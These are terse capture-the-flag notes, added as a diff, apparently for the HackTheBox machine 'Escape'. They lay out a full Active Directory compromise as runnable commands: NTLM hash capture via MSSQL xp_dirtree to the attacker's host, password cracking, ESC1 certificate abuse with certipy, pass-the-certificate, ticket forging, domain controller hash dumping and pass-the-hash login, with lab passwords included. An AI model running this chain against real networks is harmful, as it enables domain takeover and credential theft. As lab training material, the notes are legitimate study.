@@ -1,0 +1,36 @@
+Escape
+
+nmap -> open ldap | 139 netbios
+shares -> smbclient -L \\\\<target> -> smbclient \\\\<target>\\<shares>
+disclosure mssql
+
+impacket-mssclient <User>:<Password>@<target>
+responder -I tun0 -v
+sql>EXEC MASTER.sys.xp_dirtree '<myip>\exec',1,1 -> reponder hash -> john --wordlist=rockyou hash -> pass -> REGGIE1234ronnie (sql_svc) -> evil-winrm
+
+Information Disclosure -> C:\SQLServer\Logs\ERRORLOG.bak -> password RyanCooper -> evil-winrm -> get user
+
+Certipy.exe -> UserAuthentication , Authenticated Users can enroll, msPKI-Certiicate-Name-Flag -> ENTROLEE_SUPPLIES OBJECT -> ESC1 -> enroll template and specify an arbitrary Subnect Alternative Name...
+..-> certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
+
+
+ERROR -> Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) 
+resolve -> https://medium.com/@ardian.danny/hackthebox-authority-writeup-d64c34228a5a -> pass-the-certificate -> https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate
+
+certipy cert -pfx administrator.pfx -nokey -out user.crt
+certipy cert -pfx administrator.pfx -nocert -out user.key
+
+---------
+python PassTheCert/Python/passthecert.py -action ldap-shell -crt user.crt -key user.key -domain sequel.htb -dc-ip <target>
+add_user_to_group svc_ldap administrators -> get rootuser
+
+OR ----
+
+python PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to '<DChostname>$' -delegate-from '<user>$' -crt user.crt -key user.key -domain sequel.htb -dc-ip <target>
+
+sudo ntpdate <target>
+-> get a Silver Ticket-> 
+getST.py -spn 'cifs/<DOMAIN>.<DOMAIN>.HTB' -impersonate Administrator 'sequel.htb/<user>$:<pass>'
+-> dump the NTLM hashes from the DC
+KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm -> gethash -> 
+evil-winrm -i sequel.htb -u administrator -H 6961f422924da90a6928197429eea4ed
